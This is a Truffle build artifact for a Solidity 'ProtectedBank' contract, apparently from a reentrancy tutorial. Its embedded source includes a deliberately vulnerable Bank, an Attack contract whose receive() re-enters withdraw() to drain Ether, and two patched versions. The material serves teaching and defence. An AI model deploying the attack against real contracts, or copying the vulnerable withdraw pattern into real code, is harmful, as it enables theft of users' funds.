{
  "contractName": "ProtectedBank",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "balanceOf",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "deposit",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561000f575f80fd5b506105d18061001d5f395ff3fe60806040526004361061003e575f3560e01c806312065fe0146100425780633ccfd60b1461006c57806370a0823114610082578063d0e30db0146100be575b5f80fd5b34801561004d575f80fd5b506100566100c8565b6040516100639190610310565b60405180910390f35b348015610077575f80fd5b506100806100cf565b005b34801561008d575f80fd5b506100a860048036038101906100a39190610387565b610290565b6040516100b59190610310565b60405180910390f35b6100c66102a4565b005b5f47905090565b5f60015414610113576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161010a9061040c565b60405180910390fd5b600180819055505f805f3373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f205490505f811161019c576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161019390610474565b60405180910390fd5b5f3373ffffffffffffffffffffffffffffffffffffffff16826040516101c1906104bf565b5f6040518083038185875af1925050503d805f81146101fb576040519150601f19603f3d011682016040523d82523d5f602084013e610200565b606091505b5050905080610244576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161023b9061051d565b60405180910390fd5b5f805f3373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f208190555050505f600181905550565b5f602052805f5260405f205f915090505481565b345f803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f205f8282546102ef9190610568565b92505081905550565b5f819050919050565b61030a816102f8565b82525050565b5f6020820190506103235f830184610301565b92915050565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6103568261032d565b9050919050565b6103668161034c565b8114610370575f80fd5b50565b5f813590506103818161035d565b92915050565b5f6020828403121561039c5761039b610329565b5b5f6103a984828501610373565b91505092915050565b5f82825260208201905092915050565b7f5265656e7472616e637947756172643a207265656e7472616e742063616c6c005f82015250565b5f6103f6601f836103b2565b9150610401826103c2565b602082019050919050565b5f6020820190508181035f830152610423816103ea565b9050919050565b7f496e73756666696369656e742062616c616e63650000000000000000000000005f82015250565b5f61045e6014836103b2565b91506104698261042a565b602082019050919050565b5f6020820190508181035f83015261048b81610452565b9050919050565b5f81905092915050565b50565b5f6104aa5f83610492565b91506104b58261049c565b5f82019050919050565b5f6104c98261049f565b9150819050919050565b7f4661696c656420746f2073656e642045746865720000000000000000000000005f82015250565b5f6105076014836103b2565b9150610512826104d3565b602082019050919050565b5f6020820190508181035f830152610534816104fb565b9050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f610572826102f8565b915061057d836102f8565b92508282019050808211156105955761059461053b565b5b9291505056fea26469706673582212209b31abc93c6815eea4f5749787d89f084ee921aace2607bf96928ad0cd6dab7c64736f6c63430008140033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\r\n// by 0xAA\r\npragma solidity ^0.8.4;\r\n\r\ncontract Bank {\r\n    mapping (address => uint256) public balanceOf;    // mapping\r\n\r\n    // ether\r\n    function deposit() external payable {\r\n        balanceOf[msg.sender] += msg.value;\r\n    }\r\n\r\n    // msg.senderether\r\n    function withdraw() external {\r\n        // \r\n        uint256 balance = balanceOf[msg.sender];\r\n        require(balance > 0, \"Insufficient balance\");\r\n        //  ether !!! fallback/receive\r\n        (bool success, ) = msg.sender.call{value: balance}(\"\");\r\n        require(success, \"Failed to send Ether\");\r\n        // \r\n        balanceOf[msg.sender] = 0;\r\n    }\r\n\r\n    // \r\n    function getBalance() external view returns (uint256) {\r\n        return address(this).balance;\r\n    }\r\n}\r\n\r\ncontract Attack {\r\n    Bank public bank; // Bank\r\n\r\n    // Bank\r\n    constructor(Bank _bank) {\r\n        bank = _bank;\r\n    }\r\n    \r\n    // Bankwithdraw\r\n    receive() external payable {\r\n        if (address(bank).balance >= 1 ether) {\r\n            bank.withdraw();\r\n        }\r\n    }\r\n\r\n    //  msg.value  1 ether\r\n    function attack() external payable {\r\n        require(msg.value == 1 ether, \"Require 1 Ether to attack\");\r\n        bank.deposit{value: 1 ether}();\r\n        bank.withdraw();\r\n    }\r\n\r\n    // \r\n    function getBalance() external view returns (uint256) {\r\n        return address(this).balance;\r\n    }\r\n}\r\n\r\n//  --checks-effect-interaction\r\ncontract GoodBank {\r\n    mapping (address => uint256) public balanceOf;\r\n\r\n    function deposit() external payable {\r\n        balanceOf[msg.sender] += msg.value;\r\n    }\r\n\r\n    function withdraw() external {\r\n        uint256 balance = balanceOf[msg.sender];\r\n        require(balance > 0, \"Insufficient balance\");\r\n        // --checks-effect-interactionETH\r\n        // balanceOf[msg.sender]0\r\n        balanceOf[msg.sender] = 0;\r\n        (bool success, ) = msg.sender.call{value: balance}(\"\");\r\n        require(success, \"Failed to send Ether\");\r\n    }\r\n\r\n    function getBalance() external view returns (uint256) {\r\n        return address(this).balance;\r\n    }\r\n}\r\n\r\n//   \r\ncontract ProtectedBank {\r\n    mapping (address => uint256) public balanceOf;\r\n    uint256 private _status; // \r\n\r\n    // \r\n    modifier nonReentrant() {\r\n        //  nonReentrant _status  0\r\n        require(_status == 0, \"ReentrancyGuard: reentrant call\");\r\n        //  nonReentrant \r\n        _status = 1;\r\n        _;\r\n        //  _status 0\r\n        _status = 0;\r\n    }\r\n\r\n\r\n    function deposit() external payable {\r\n        balanceOf[msg.sender] += msg.value;\r\n    }\r\n\r\n    // \r\n    function withdraw() external nonReentrant{\r\n        uint256 balance = balanceOf[msg.sender];\r\n        require(balance > 0, \"Insufficient balance\");\r\n\r\n        (bool success, ) = msg.sender.call{value: balance}(\"\");\r\n        require(success, \"Failed to send Ether\");\r\n\r\n        balanceOf[msg.sender] = 0;\r\n    }\r\n\r\n    function getBalance() external view returns (uint256) {\r\n        return address(this).balance;\r\n    }\r\n}\r\n",
  "sourcePath": "/home/ap/truffleProject1/contracts/bank.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.20+commit.a1b79de6.Emscripten.clang"
  },
  "schemaVersion": "3.4.14",
  "updatedAt": "2023-06-27T04:20:11.793Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}